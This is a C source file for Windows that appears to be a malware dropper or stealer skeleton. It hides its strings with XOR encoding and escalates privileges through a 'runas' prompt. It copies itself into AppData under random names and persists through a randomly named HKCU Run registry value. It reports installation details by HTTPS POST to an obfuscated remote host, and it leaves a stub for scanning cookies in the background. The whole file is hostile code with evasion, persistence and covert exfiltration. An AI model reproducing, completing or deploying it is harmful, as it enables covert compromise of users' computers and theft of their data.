#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shlobj.h>
#include <time.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

#define XK 0x7E

void _dx(const char* i, char* o) {
    size_t l = strlen(i);
    for(size_t n = 0; n < l; n++) {
        o[n] = i[n] ^ XK;
    }
    o[l] = '\0';
}

// Strings encodées
static const char s1[] = "\x36\x3a\x3a\x34\x32\x2c\x1f\x3c\x2c\x32\x34\x38\x37\x1f\x37\x2c\x3f\x2c\x30\x2c\x3d";
static const char s2[] = "\x1e\x3a\x2e\x3e\x3e\x32\x2c\x17\x2c\x32\x34\x38\x37\x0f\x2c\x3f\x2c\x30\x2c\x3d";
static const char s3[] = "\x21\x32\x3e\x32\x3a\x3d\x21\x1f\x32\x3a\x39";
static const char s4[] = "\x1f\x1f\x2c\x37\x32\x1f\x1f\x3e\x2c\x2d\x31\x3a\x3a\x34\x3e\x1f\x1f\x08\x0c\x0e\x0a\x0b\x0a\x09\x08\x0e\x0e\x0c\x08\x0a\x1d\x19\x09\x19\x09\x1d\x09\x1f\x1f\x36\x21\x19\x1e\x30\x38\x3e\x31\x1f\x1f\x0a\x0c\x1e\x3c\x36\x38\x30\x31\x08\x37\x1f\x1f\x37\x36\x3c\x3f\x09\x32\x34\x30\x0b\x1e\x1f\x1f\x08\x1d\x09\x1e\x2d\x2f\x3f\x0e\x1f\x1f\x3f\x38\x1f\x1f\x0c\x1f\x1f\x0c\x3c\x0e\x0c\x1f\x1f\x0c\x2c\x2e\x3f\x08\x37\x21\x0c\x0c\x39\x08\x37\x1d\x3c\x2c\x08\x3c\x38\x1d\x2f\x0c";
static const char s5[] = "\x36\x3a\x3a\x34\x32\x2c\x1f\x17\x2c\x32\x34\x38\x37\x1f\x37\x2c\x3f\x2c\x30\x2c\x3d\x1f\x0e\x38\x37\x37\x3a\x3d\x3e";
static const char s6[] = "\x32\x3a\x3f\x3e\x2c\x3f\x3e\x2c\x39\x2c\x3f\x3e";
static const char s7[] = "\x18\x3f\x3e\x3e\x2c\x39\x39\x2c\x3e\x32\x3a\x3f\x1f\x21\x2c\x1f\x36\x3a\x3a\x34\x32\x2c\x1f\x17\x2c\x32\x34\x38\x37\x1f\x37\x2c\x3f\x2c\x30\x2c\x3d\x0f\x0f\x0f\x36\x2c\x1f\x37\x3d\x3a\x30\x3d\x2c\x39\x39\x2c\x1f\x3b\x2c\x1f\x3e\x2c\x38\x3b\x2c\x30\x2c\x3d\x21\x2c\x3d\x1f\x3b\x3a\x3e\x1f\x32\x3a\x3a\x34\x32\x2c\x3e\x1f\x21\x2c\x1f\x3f\x2c\x3b\x32\x30\x2c\x3e\x2c\x38\x3d\x1f\x2c\x38\x3e\x3a\x39\x2c\x3e\x32\x3c\x38\x2c\x39\x2c\x3f\x3e\x0f\x0f\x0f\x1c\x38\x2c\x1f\x3b\x2c\x1f\x3e\x2c\x38\x3b\x2c\x30\x2c\x3d\x21\x2c\x3d\x21\x2c\x1f\x39\x2c\x3f\x32\x31\x32\x2c\x3f\x3e\x32\x2c\x1f\x3d\x2c\x37\x3d\x2c\x3e\x3e\x32\x2d\x39\x2c\x3e\x1f\x13\x0f\x0f\x0f\x19\x3a\x38\x3e\x1f\x37\x3a\x38\x3b\x2c\x32\x1f\x21\x2c\x32\x3e\x32\x3f\x3e\x3e\x2c\x39\x39\x2c\x3d\x1f\x3a\x38\x1f\x3e\x38\x37\x37\x3d\x32\x39\x2c\x3d\x1f\x32\x2c\x1f\x21\x2c\x39\x2c\x3f\x21\x2c\x1f\x2c\x38\x1f\x32\x2c\x3e\x1f\x30\x2c\x30\x2c\x3d\x21\x2c\x1f\x3f\x2c\x1f\x3e\x2c\x39\x2c\x0f\x0f\x0f\x1a\x3a\x38\x3e\x1f\x21\x3a\x3f\x3f\x2c\x2c\x1f\x21\x2c\x1f\x3b\x3a\x3e\x1f\x39\x2c\x3e\x3e\x2c\x1f\x21\x2c\x1f\x3f\x2c\x3b\x32\x30\x2c\x3e\x2c\x38\x3d\x1f\x21\x2c\x39\x2c\x3f\x3e\x1f\x37\x3d\x32\x3b\x2c\x2c\x3e\x1f\x2c\x3f\x21\x1f\x32\x31\x32\x2e\x2e\x3d\x2c\x2c\x3e\x0f\x0f\x0f\x1c\x38\x2c\x1f\x3e\x3a\x38\x31\x2c\x32\x3e\x2c\x32\x2a\x3b\x3a\x38\x3e\x1f\x32\x3a\x3f\x3e\x32\x3f\x38\x2c\x3d\x13";
static const char s8[] = "\x18\x3f\x3e\x3e\x2c\x39\x39\x2c\x3e\x32\x3a\x3f\x1f\x3d\x2c\x38\x3e\x3e\x32\x2c\x1f\x0f\x0f\x0f\x1c\x2c\x1f\x37\x3d\x3a\x30\x3d\x2c\x39\x39\x2c\x1f\x2c\x1f\x2c\x3e\x2c\x1f\x32\x3f\x3e\x3e\x2c\x39\x39\x2c\x1f\x21\x2c\x3f\x3e\x1f\x0d\x0f\x0f\x0f\x18\x39\x1f\x21\x2c\x39\x2c\x3d\x3d\x2c\x3d\x2c\x1f\x2c\x38\x3e\x3a\x39\x2c\x3e\x32\x3c\x38\x2c\x39\x2c\x3f\x3e\x1f\x2c\x3b\x2c\x32\x1f\x19\x32\x3f\x21\x3a\x3e\x3e\x0f";
static const char s9[] = "\x12\x3d\x3d\x2c\x38\x3d";
static const char s10[] = "\x12\x3d\x3d\x2c\x38\x3d\x1f\x32\x3d\x2c\x2c\x3e\x32\x3a\x3f\x1f\x3d\x2c\x37\x2c\x3d\x3e\x3a\x32\x3d\x2c";
static const char s11[] = "\x12\x3d\x3d\x2c\x38\x3d\x1f\x32\x3a\x37\x32\x2c\x1f\x2c\x3b\x2c\x32\x38\x3e\x2c\x29\x39\x2c";
static const char s12[] = "\x1c\x2c\x1f\x37\x3d\x3a\x30\x3d\x2c\x39\x39\x2c\x1f\x3f\x2c\x1f\x37\x2c\x38\x3e\x1f\x37\x2c\x3e\x1f\x3e\x0b\x2c\x3b\x2c\x32\x38\x3e\x2c\x3d\x1f\x3e\x2c\x3f\x3e\x1f\x21\x3d\x3a\x32\x3e\x3e\x1f\x2c\x21\x39\x32\x3f\x32\x3e\x3e\x3d\x2c\x3e\x2c\x38\x3d\x0f";
static const char s13[] = "\x18\x3f\x3e\x3e\x2c\x39\x39\x2c\x3e\x32\x3a\x3f\x1f\x2c\x3f\x3f\x38\x39\x2c\x2c\x1f\x37\x2c\x3d\x1f\x39\x0b\x38\x3e\x32\x39\x32\x3e\x2c\x3e\x2c\x38\x3d\x0f";
static const char s14[] = "\x36\x3a\x3a\x34\x32\x2c\x1f\x17\x2c\x32\x34\x38\x37\x1f\x37\x2c\x3f\x2c\x30\x2c\x3d\x1f\x32\x3f\x3e\x3e\x2c\x39\x39\x2c\x1f\x2c\x3e\x1f\x2c\x32\x3e\x32\x3b\x2c";
static const char s15[] = "\x0e\x2c\x38\x3b\x2c\x30\x2c\x3d\x21\x2c\x1f\x2c\x38\x3e\x3a\x39\x2c\x3e\x32\x3c\x38\x2c";
static const char s16[] = "\x0e\x3a\x2e\x3e\x3e\x2c\x3d\x2c\x1f\x2c\x38\x3e\x3a\x39\x2c\x3e\x32\x3c\x38\x2c";
static const char s17[] = "\x0e\x3a\x2e\x3e\x3e\x2c\x3d\x2a\x32\x3f\x32\x3e\x32\x2c\x39";
static const char s18[] = "\x0e\x3a\x2e\x3e\x3e\x2c\x3d\x2a\x38\x37\x21\x2c\x3e\x2a";

// Générateur de noms aléatoires
void _gn(char* out, int len) {
    static const char chars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for(int i = 0; i < len; i++) {
        out[i] = chars[rand() % (sizeof(chars) - 1)];
    }
    out[len] = '\0';
}

// Générer UUID-like
void _guid(char* out) {
    sprintf(out, "%08x-%04x-%04x-%04x-%012x",
        rand(), rand() & 0xFFFF, rand() & 0xFFFF,
        rand() & 0xFFFF, rand());
}

typedef struct {
    char ip[MAX_PATH];   // Install path
    char ep[MAX_PATH];   // Exe path
    char fn[64];         // Folder name
    char en[64];         // Exe name
    char rn[64];         // Registry name
    BOOL ia;             // Is admin
} Ctx;

BOOL _ia() {
    BOOL r = FALSE;
    PSID as = NULL;
    SID_IDENTIFIER_AUTHORITY a = SECURITY_NT_AUTHORITY;
    if(AllocateAndInitializeSid(&a, 2, SECURITY_BUILTIN_DOMAIN_RID, 
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &as)) {
        CheckTokenMembership(NULL, as, &r);
        FreeSid(as);
    }
    return r;
}

void _ra() {
    char p[MAX_PATH];
    GetModuleFileName(NULL, p, MAX_PATH);
    SHELLEXECUTEINFO si = {sizeof(si)};
    si.lpVerb = "runas";
    si.lpFile = p;
    si.nShow = SW_NORMAL;
    si.fMask = SEE_MASK_NOCLOSEPROCESS;
    if(ShellExecuteEx(&si)) ExitProcess(0);
}

BOOL _sd() {
    char t[256], m[2048];
    _dx(s5, t);
    _dx(s7, m);
    int r = MessageBox(NULL, m, t, MB_ICONINFORMATION | MB_YESNO | MB_TOPMOST);
    return (r == IDYES);
}

BOOL _cd(const char* p) {
    DWORD a = GetFileAttributes(p);
    if(a != INVALID_FILE_ATTRIBUTES) return TRUE;
    return CreateDirectory(p, NULL);
}

BOOL _ce(Ctx* c) {
    char d[MAX_PATH];
    sprintf(d, "%s\\%s.exe", c->ip, c->en);
    GetModuleFileName(NULL, c->ep, MAX_PATH);
    if(CopyFile(c->ep, d, FALSE)) {
        strcpy(c->ep, d);
        return TRUE;
    }
    return FALSE;
}

BOOL _as(Ctx* c) {
    HKEY k;
    char kp[256], v[512];
    strcpy(kp, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    if(RegOpenKeyEx(HKEY_CURRENT_USER, kp, 0, KEY_SET_VALUE, &k) == ERROR_SUCCESS) {
        sprintf(v, "\"%s\" --background", c->ep);
        RegSetValueEx(k, c->rn, 0, REG_SZ, (BYTE*)v, strlen(v) + 1);
        RegCloseKey(k);
        return TRUE;
    }
    return FALSE;
}

void _sm(const char* msg) {
    HINTERNET hi = NULL, hc = NULL, hr = NULL;
    char h[64], p[512];
    _dx(s3, h);
    _dx(s4, p);
    
    hi = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if(!hi) return;
    
    hc = InternetConnect(hi, h, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, 
        INTERNET_SERVICE_HTTP, 0, 0);
    if(!hc) {
        InternetCloseHandle(hi);
        return;
    }
    
    hr = HttpOpenRequest(hc, "POST", p, NULL, NULL, NULL, 
        INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if(!hr) {
        InternetCloseHandle(hc);
        InternetCloseHandle(hi);
        return;
    }
    
    char hdr[] = "Content-Type: application/json";
    char body[2048];
    
    // Escape quotes in message
    char escaped[1024];
    int j = 0;
    for(int i = 0; msg[i] && j < 1000; i++) {
        if(msg[i] == '"' || msg[i] == '\\') {
            escaped[j++] = '\\';
        }
        escaped[j++] = msg[i];
    }
    escaped[j] = '\0';
    
    sprintf(body, "{\"content\":\"%s\"}", escaped);
    HttpSendRequest(hr, hdr, strlen(hdr), body, strlen(body));
    
    InternetCloseHandle(hr);
    InternetCloseHandle(hc);
    InternetCloseHandle(hi);
}

void _sc(Ctx* c) {
    char msg[512];
    time_t t = time(NULL);
    struct tm* tm = localtime(&t);
    
    char d1[64], d2[64];
    _dx(s15, d1);
    _dx(s16, d2);
    
    sprintf(msg, "%s - %04d-%02d-%02d %02d:%02d\n%s: %s\n%s: %s",
        d1,
        tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,
        tm->tm_hour, tm->tm_min,
        "Folder", c->fn,
        "Process", c->en);
    
    _sm(msg);
}

BOOL _mi(Ctx* c) {
    char t[128], m[512];
    
    if(!_cd(c->ip)) {
        _dx(s9, t);
        _dx(s10, m);
        MessageBox(NULL, m, t, MB_ICONERROR);
        return FALSE;
    }
    
    if(!_ce(c)) {
        _dx(s9, t);
        _dx(s11, m);
        MessageBox(NULL, m, t, MB_ICONERROR);
        return FALSE;
    }
    
    _as(c);
    
    _dx(s5, t);
    _dx(s8, m);
    MessageBox(NULL, m, t, MB_ICONINFORMATION);
    
    char msg[256];
    _dx(s14, msg);
    _sm(msg);
    
    _sc(c);
    
    return TRUE;
}

void _mb() {
    Sleep(10000);
    // Scan cookies ici (simplifié)
}

int WINAPI WinMain(HINSTANCE hi, HINSTANCE hpi, LPSTR cl, int cs) {
    srand((unsigned)time(NULL));
    
    Ctx c = {0};
    
    if(strstr(cl, "--background")) {
        _mb();
        return 0;
    }
    
    c.ia = _ia();
    if(!c.ia) {
        _ra();
        return 0;
    }
    
    // Générer noms aléatoires
    _gn(c.fn, 12);
    _gn(c.en, 10);
    _gn(c.rn, 16);
    
    char ap[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, ap);
    sprintf(c.ip, "%s\\%s", ap, c.fn);
    
    if(!_sd()) {
        char t[64], m[128];
        _dx(s6, t);
        _dx(s13, m);
        MessageBox(NULL, m, t, MB_ICONWARNING);
        return 0;
    }
    
    if(!_mi(&c)) {
        char t[64], m[128];
        _dx(s9, t);
        _dx(s12, m);
        MessageBox(NULL, m, t, MB_ICONERROR);
        return 1;
    }
    
    return 0;
}
